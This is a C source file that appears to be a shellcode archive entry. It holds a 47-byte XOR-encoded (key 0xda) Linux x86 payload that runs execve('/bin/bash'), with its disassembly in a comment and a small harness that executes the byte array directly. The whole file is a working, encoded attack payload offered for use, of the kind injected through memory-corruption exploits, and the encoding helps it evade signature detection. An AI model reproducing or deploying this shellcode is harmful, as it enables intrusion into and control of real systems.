/*
Title:    Linux x86 execve("/bin/bash") - XOR encoded - 47 bytes
Author:   Amine Kanane <aminekanane_93@hotmail.com>
Desc:     Xor Encoded Shellcode that Pops a /bin/bash Using The Stack

Disassembly of section .text:

08048060 <_start>:
 8048060:	eb 09                	jmp    804806b <decode_shellcode>

08048062 <shellcode>:
 8048062:	5e                   	pop    esi

08048063 <decode>:
 8048063:	80 36 da             	xor    BYTE PTR [esi],0xda
 8048066:	74 08                	je     8048070 <dinamine>
 8048068:	46                   	inc    esi
 8048069:	eb f8                	jmp    8048063 <decode>

0804806b <decode_shellcode>:
 804806b:	e8 f2 ff ff ff       	call   8048062 <shellcode>

08048070 <dinamine>:
 8048070:	eb 1a                	jmp    804808c <dinamine+0x1c>
 8048072:	8a 53 38             	mov    dl,BYTE PTR [ebx+0x38]
 8048075:	b2 b8                	mov    dl,0xb8
 8048077:	bb a9 b2 b2 f5       	mov    ebx,0xf5b2b2a9
 804807c:	f5                   	cmc
 804807d:	f5                   	cmc
 804807e:	f5                   	cmc
 804807f:	b2 f5                	mov    dl,0xf5
 8048081:	b8 b3 b4 53 39       	mov    eax,0x3953b4b3
 8048086:	8a 89 53 3b 6a d1    	mov    cl,BYTE PTR [ecx-0x2e95c4ad]
 804808c:	17                   	pop    ss
 804808d:	5a                   	pop    edx
 804808e:	da                   	.byte 0xda

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = "\xeb\x09\x5e\x80\x36\xda\x74"
                       "\x08\x46\xeb\xf8\xe8\xf2\xff"
                       "\xff\xff\xeb\x1a\x8a\x53\x38"
                       "\xb2\xb8\xbb\xa9\xb2\xb2\xf5"
                       "\xf5\xf5\xf5\xb2\xf5\xb8\xb3"
                       "\xb4\x53\x39\x8a\x89\x53\x3b"
                       "\x6a\xd1\x17\x5a\xda";
main()
{
	printf("Shellcode Length: %d\n", strlen(code));

	int (*ret)() = (int(*)())code;
	ret();
}
